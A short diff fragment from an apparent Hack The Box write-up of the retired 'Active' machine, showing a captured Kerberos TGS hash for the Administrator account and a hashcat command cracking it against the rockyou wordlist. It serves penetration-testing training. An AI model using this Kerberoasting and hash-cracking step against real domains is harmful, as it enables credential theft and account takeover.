@@ -232,7 +232,6 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$a2280caecef0388b
 ```
 ## Cracked the kerberos ticket(TGS) hash via hashcat
 ```bash
-❯ nano hash_kerberos_ticket_TGS.hash
 ~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/active_retired 10s ❯ hashcat -m 13100  hash_kerberos_ticket_TGS.hash /home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
 hashcat (v6.1.1) starting...
 
